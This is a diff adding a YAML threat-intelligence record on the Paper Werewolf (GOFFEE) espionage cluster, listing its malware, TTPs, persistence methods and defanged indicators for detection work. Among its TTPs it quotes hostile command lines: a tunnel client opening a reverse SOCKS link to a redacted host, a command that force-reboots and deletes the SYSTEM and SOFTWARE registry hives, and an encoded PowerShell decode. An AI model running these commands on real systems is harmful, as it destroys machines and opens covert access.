@@ -1,0 +1,71 @@
+title: Espionage cluster Paper Werewolf engages in destructive behavior
+description: Paper Werewolf (also known as GOFFEE) conducts cyber espionage and destructive
+  attacks against government, energy, financial, and media organizations using phishing
+  emails with malicious Word macros, custom implants, and post-exploitation frameworks.
+  The cluster uses PowerShell-based tools, a malicious IIS module, and Chisel for
+  persistent access and lateral movement.
+attribution: Paper Werewolf (GOFFEE)
+malware_families:
+- PowerRAT
+- PowerTaskel
+- QwakMyAgent
+- Owowa
+- Poseidon
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - mshta.exe
+  - mastc.exe
+  - explorer.exe
+  command_lines:
+  - mastc.exe client --tls-skip-verify -v https://[redacted]:49611 R:socks
+  - cmd.exe /c 'shutdown /r /f /t 5 && reg delete HKEY_LOCAL_MACHINE\SYSTEM /f &&
+    reg delete HKEY_LOCAL_MACHINE\SOFTWARE /f'
+  - net user [redacted] [redacted] /domain
+  powershell:
+  - '[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($env:AZURE_RESOURCE_GROUP+$env:ONEDRIVE_RESOURCE_GROUP))'
+  scripts:
+  - UserCache.ini
+  - UserCache.ini.hta
+  - UserCacheHelper.lnk.js
+  registry_keys:
+  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\LOAD
+  - HKEY_LOCAL_MACHINE\SYSTEM
+  - HKEY_LOCAL_MACHINE\SOFTWARE
+  image_loads: []
+  network_connections:
+  - PowerRAT -> hxxp://[redacted]:80/api/texts/<victim_id>
+  - mastc.exe -> [redacted]:49611
+  file_activity:
+  - '%USERPROFILE%\UserCache.ini'
+  - '%USERPROFILE%\UserCache.ini.hta'
+  - '%USERPROFILE%\UserCacheHelper.lnk.js'
+  persistence:
+  - Registry parameter HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\LOAD
+    pointing to UserCache.ini.hta
+  - Malicious IIS module Owowa installed on IIS server for credential capture via
+    OWA
+  process_relations:
+  - mshta.exe -> UserCacheHelper.lnk.js
+  - UserCacheHelper.lnk.js -> UserCache.ini (PowerShell)
+iocs:
+  hashes:
+  - fa8853aaa156485855b77a16a2f613d9f58d82ef63505be8b19563827089bf52
+  - 13252199b18d5257a60f57de95d8c6be7d7973df7f957bca8c2f31e15fcc947b
+  - 8ba4cd7ea29f990cb86291003f82239bfafe28910d080b5b7d3db78e83c1b6f3
+  ip_addresses:
+  - 94.103.85[.]47
+  - 185.244.182[.]87
+  - 5.252.176[.]55
+  - 85.198.110[.]216
+  domains:
+  - disk-yanbex[.]ru
+  - lobbyluxuries[.]com
+  urls:
+  - hxxps://disk-yanbex[.]ru/track?rid=ZCj7wec
+authors:
+- BI.ZONE Threat Intelligence
+reference: https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami
+date_of_publication: May 18, 2026
+file_creation_date: May 22, 2026
